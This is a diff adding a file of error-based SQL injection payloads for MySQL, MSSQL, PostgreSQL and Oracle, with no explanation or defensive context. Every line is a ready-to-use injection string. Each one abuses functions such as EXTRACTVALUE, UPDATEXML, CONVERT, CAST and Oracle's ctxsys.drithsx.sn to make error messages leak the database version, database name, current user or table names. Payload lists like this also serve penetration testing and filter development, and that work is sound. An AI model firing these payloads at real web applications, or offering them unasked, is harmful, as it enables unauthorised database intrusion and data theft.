@@ -1,0 +1,25 @@
+# Modern Error-Based SQLi Payloads
+
+# MySQL (Modern & Legacy)
+' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,(SELECT DATABASE()),0x7e,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- -
+' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT USER()),0x7e))-- -
+' AND UPDATEXML(1,CONCAT(0x7e,(SELECT @@version),0x7e),1)-- -
+' AND ST_LatFromGeoHash(CONCAT(0x7e,(SELECT USER()),0x7e))-- -
+' AND ST_LongFromGeoHash(CONCAT(0x7e,(SELECT DATABASE()),0x7e))-- -
+
+# MSSQL
+' AND 1=CONVERT(int,(SELECT @@version))--
+' AND 1=CONVERT(int,(SELECT DB_NAME()))--
+' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sys.databases))--
+' AND 1=CONVERT(int,(SELECT user_name()))--
+
+# PostgreSQL
+' AND 1=CAST((SELECT version()) AS INTEGER)--
+' AND 1=CAST((SELECT current_database()) AS INTEGER)--
+' AND 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS INTEGER)--
+' AND 1=(SELECT 1 FROM (SELECT COUNT(*),query_to_xml('SELECT 1',true,false,''))x)--
+
+# Oracle
+' AND 1=(SELECT UPPER(XMLType(CHR(60)||CHR(101)||CHR(110)||CHR(118)||CHR(62)||(SELECT USER FROM DUAL)||CHR(60)||CHR(47)||CHR(101)||CHR(110)||CHR(118)||CHR(62))) FROM DUAL)--
+' AND 1=ctxsys.drithsx.sn(1,(SELECT user FROM dual))--
+' AND 1=dbms_utility.sqlid_to_sqlhash((SELECT user FROM dual))--
